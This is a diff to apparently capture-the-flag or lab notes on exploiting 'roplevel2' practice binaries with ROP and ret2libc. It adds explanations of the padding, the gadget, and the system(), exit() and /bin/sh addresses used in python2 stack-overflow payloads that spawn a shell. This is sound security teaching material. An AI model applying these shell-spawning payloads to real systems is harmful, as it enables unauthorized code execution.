@@ -106,6 +106,16 @@ python2 -c "print('AAAABBBBCCCCDDDDEEEE\x00\xdd\xdf\xf7' + '\xda\x91\x04\x08GGGG
 python2 -c "print('AAAABBBBCCCCDDDDEEEE\x00\xdd\xdf\xf7' + '\xda\x91\x04\x08GGGG\x14\xb4\x04\x08')" | ./roplevel2
 ```
 
+- FINAL PADDING = INITIAL PADDING + EBX
+
+- FINAL EXPLOIT = FINAL PADDING (AAAABBBBCCCCDDDDEEEE\x00\xdd\xdf\xf7) + GADGET(0x080491da) + EXIT (GGGG) + ARGUMENT (str1[], str2[], str3[])
+
+- Gadget is called first which pushes the current value of `ebx` to the top of the stack. When the gadget completes, it calls that function which is the SYSTEM function call which then looks at the top 2 values on stack for the exit address and the argument.
+
+- 0xf7dfdd00 is the `system()` address
+
+- 0x080491da is the gadget address
+
 ### Answer for shell version:
 
 Using pure ret2libc:
@@ -114,17 +124,39 @@ Using pure ret2libc:
 (python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\x00\xdd\xdf\xf7\x80\x06\xdf\xf7\x62\x8b\xf4\xf7')"; cat) | ./roplevel2-shellversion
 ```
 
+- 0xf7dfdd00 is the `system()` address
+
+- 0xf7df0680 is the `exit()` address
+
+- 0xf7f48b62 is the `/bin/sh` address
+
 Using gadget() function:
 
 ```
 (python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\xda\x91\x04\x08\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2-shellversion
 ```
 
+- 0x080491da is the gadget address
+
+- 0xf7dfdd00 is the `system()` address
+
+- 0x08049060 is the `exit()` address
+
+- 0xf7f48b62 is the `/bin/sh` address
+
 Using `ROPGadget --binary ./roplevel2-shellversion` (`0x080492c2 : sub al, 0x24 ; ret`):
 
 ```
 (python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\xc2\x92\x04\x08\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2-shellversion
 ```
+
+- 0x080492c2 is the gadget address
+
+- 0xf7dfdd00 is the `system()` address
+
+- 0x08049060 is the `exit()` address
+
+- 0xf7f48b62 is the `/bin/sh` address
 
 ### Notes:
 
@@ -136,6 +168,6 @@ Over [here](https://icyphox.sh/blog/rop-on-arm/) is a walkthrough of someone att
 
 ### References:
 
-https://developer.arm.com/documentation/dui0068/b/Thumb-Instruction-Reference/Thumb-memory-access-instructions/PUSH-and-POP
+[PUSH and POP in ARM](https://developer.arm.com/documentation/dui0068/b/Thumb-Instruction-Reference/Thumb-memory-access-instructions/PUSH-and-POP)
 
-https://developer.arm.com/documentation/dui0041/c/Babbfdih#
+[LDR in ARM](https://developer.arm.com/documentation/dui0041/c/Babbfdih#)
